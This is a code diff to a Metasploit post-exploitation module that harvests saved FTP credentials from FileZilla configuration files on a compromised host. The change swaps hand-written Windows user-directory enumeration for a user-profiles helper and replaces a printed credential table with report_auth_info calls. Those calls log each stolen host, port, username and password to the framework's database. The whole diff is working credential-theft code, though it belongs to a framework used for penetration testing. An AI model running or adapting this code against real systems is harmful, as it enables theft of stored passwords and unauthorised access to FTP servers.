@@ -13,10 +13,12 @@ require 'msf/core'
 require 'rex'
 require 'rexml/document'
 require 'msf/core/post/file'
+require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::File
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info(info,
@@ -35,6 +37,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
+		paths = []
 		case session.platform
 		when /unix|linux|bsd/
 			@platform = :unix
@@ -43,23 +46,13 @@ class Metasploit3 < Msf::Post
 			@platform = :osx
 			paths = enum_users_unix
 		when /win/
-			@platform = :windows
-			drive = session.fs.file.expand_path("%SystemDrive%")
-			os = session.sys.config.sysinfo['OS']
-
-			if os =~ /Windows 7|Vista|2008/
-				@appdata = '\\AppData\\Roaming'
-				@users = drive + '\\Users'
-			else
-				@appdata = '\\Application Data'
-				@users = drive + '\\Documents and Settings'
+			profiles = grab_user_profiles()
+			profiles.each do |user|
+				next if user['AppData'] == nil
+				fzdir = check_filezilla(user['AppData'])
+				paths << fzdir if fzdir
 			end
-
-			if session.type != "meterpreter"
-				print_error "Only meterpreter sessions are supported on windows hosts"
-				return
-			end
-			paths = enum_users_windows
+			
 		else
 			print_error "Unsupported platform #{session.platform}"
 			return
@@ -107,30 +100,6 @@ class Metasploit3 < Msf::Post
 		return paths
 	end
 
-	def enum_users_windows
-		paths = []
-
-		if got_root?
-			session.fs.dir.foreach(@users) do |path|
-				next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
-				filezilladir = "#{@users}\\#{path}#{@appdata}\\"
-				dir = check_filezilla(filezilladir)
-				if dir
-					paths << dir
-				end
-			end
-		else
-			print_status "We do not have SYSTEM checking #{whoami} account"
-			# not root
-			path = "#{@users}\\#{whoami}#{@appdata}"
-			session.fs.dir.foreach(path) do |dir|
-				if dir =~ /FileZilla/
-					paths << "#{path}\\#{dir}"
-				end
-			end
-		end
-		return paths
-	end
 
 	def check_filezilla(filezilladir)
 		print_status("Checking for Filezilla directory in: #{filezilladir}")
@@ -148,17 +117,6 @@ class Metasploit3 < Msf::Post
 		sitedata = ""
 		recentdata = ""
 		creds = []
-		credentials = Rex::Ui::Text::Table.new(
-		'Header'    => "FileZilla Credentials",
-		'Indent'    => 1,
-		'Columns'   =>
-		[
-			"Host",
-			"Port",
-			"Login Type",
-			"User",
-			"Password"
-		])
 
 		paths.each do |path|
 			print_status("Reading sitemanager.xml and recentservers.xml files from #{path}")
@@ -201,12 +159,18 @@ class Metasploit3 < Msf::Post
 			end
 			creds.each do |cred|
 				cred.each do |loot|
-					credentials << [loot['host'], loot['port'], loot['logontype'], loot['user'], loot['password']]
+					report_auth_info(
+						:host  => loot['host'],
+						:port => loot['port'],
+						:sname => 'FTP',
+						:source_id => session.db_record.id,
+						:source_type => "exploit",
+						:user => loot['user'],
+						:pass => loot['password'])
 				end
 			end
 		end
 
-		store_loot("filezilla.client.creds", "text/plain", session, credentials.to_s, "filezilla_client_credentials.txt", "FileZilla Client Credentials")
 	end
 
 	def parse_accounts(data)
